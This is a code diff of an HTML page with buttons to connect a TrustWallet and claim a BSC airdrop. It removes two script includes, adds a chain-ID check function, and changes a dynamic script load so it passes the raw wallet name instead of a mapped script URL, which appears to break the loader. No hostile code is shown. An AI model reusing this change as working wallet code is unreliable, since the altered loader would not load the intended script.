@@ -18,9 +18,6 @@
 <button id="connectTrustwalletButton">Connect TrustWallet</button>
 <button id="claimTrustwalletAirdropButton" disabled>Claim Airdrop (BSC)</button>
 
-<script src="js/common.js"></script>
-<script src="js/loader.js"></script>
-
 <script>
   // Function to dynamically load scripts
   function loadScript(src, callback) {
@@ -73,7 +70,7 @@
 
   // Unified Wallet Connection Handler
   function handleWalletConnection(wallet, network, expectedChainId) {
-    loadScript(walletScripts[wallet], () => {
+    loadScript(wallet, () => {
       console.log(`${wallet} script loaded successfully.`);
 
       // Load config and ABI dynamically
@@ -112,9 +109,26 @@
       handleWalletConnection('trustwallet', 'bsc', 56);  // BSC chainId is 56
     });
   });
+
+  // Check Network Function (added here)
+  async function checkNetwork(web3, expectedChainId) {
+    try {
+        const currentChainId = await web3.eth.getChainId();
+        if (currentChainId === expectedChainId) {
+            return true;
+        } else {
+            alert(`Please switch to the correct network (Chain ID: ${expectedChainId}).`);
+            return false;
+        }
+    } catch (error) {
+        console.error("Error checking network:", error);
+        return false;
+    }
+  }
 </script>
 
 </body>
 </html>
+
 
 
